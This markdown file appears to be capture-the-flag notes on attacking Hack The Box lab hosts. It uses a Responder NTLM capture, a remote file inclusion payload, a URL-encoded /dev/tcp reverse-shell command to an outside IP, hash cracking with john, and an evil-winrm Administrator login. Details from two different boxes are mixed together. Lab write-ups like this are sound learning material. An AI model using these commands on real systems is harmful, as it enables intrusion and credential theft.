# reconnaissance
## nmap scan
- [nmap scan](./evidences/nmap.txt)
- OpenSSH 7.6p1 22/tcp
- Apache web server on port 80/tcp

## hostname
- thetoppers.htb

## ffuf fuzzing
- 

# resource development
## responder tool
- [NTLM hash](./evidences/ntlm_hash.png)
- responder -I tun0
- listening on the interface connected to the LAN of the target for LLMNR (Link Local Multicast Neighbor Resolution)
- so that we can get the username and HASH (MD4) used to authenticate via NTLM

# initial access
## remote-file-intrusion
- [RFI command](./evidences/remote_file_intrusion.png)
- index.php?page=//10.10.14.78/test
- the responder logs are stored in: /usr/share/responder/log
- the hash inside the log is saved inside [NTLM hash] (./evidences/hash.txt)
http://thetoppers.htb/shell.php?cmd=sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.121%2F9001%200%3E%261

## hash crack
- [NTLM hash cracked](./evidences/hash_cracking.png)
- john --wordlist=/usr/share/wordlist/seclists/Passwords/Leaked-Databases/rockyou-75.txt ./evidences/hash.txt

## WinRM access
- [WinRM shell access](./evidences/WinRM_access.png)
- evil-winrm -i unika.htb -u Administrator -p badminton

# privilege escalation
- [root flag](./evidences/root_flag.png)
- cat C:\Users\mike\Desktop\flag.txt
